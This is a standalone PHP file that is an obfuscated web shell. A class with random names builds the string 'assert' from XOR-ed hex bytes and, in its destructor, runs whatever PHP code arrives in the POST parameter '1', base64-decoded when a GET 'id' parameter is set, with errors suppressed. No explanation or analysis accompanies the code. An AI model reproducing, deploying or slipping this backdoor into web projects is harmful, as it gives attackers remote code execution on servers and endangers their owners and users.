<?php 
class BBTT { 
    function fKgY() {
        $whyM = "\xb" ^ "\x6a";
        $XWTM = "\x4" ^ "\x77";
        $hVVl = "\x47" ^ "\x34";
        $JzPi = "\x56" ^ "\x33";
        $RXft = "\xac" ^ "\xde";
        $Qhnl = "\xa1" ^ "\xd5";
        $Bejm =$whyM.$XWTM.$hVVl.$JzPi.$RXft.$Qhnl;
        return $Bejm;
    }
    function __destruct(){
        $tTHA=$this->fKgY();
        @$tTHA($this->LU);
    }
}
$bbtt = new BBTT();
@$bbtt->LU = isset($_GET['id'])?base64_decode($_POST['1']):$_POST['1'];
?>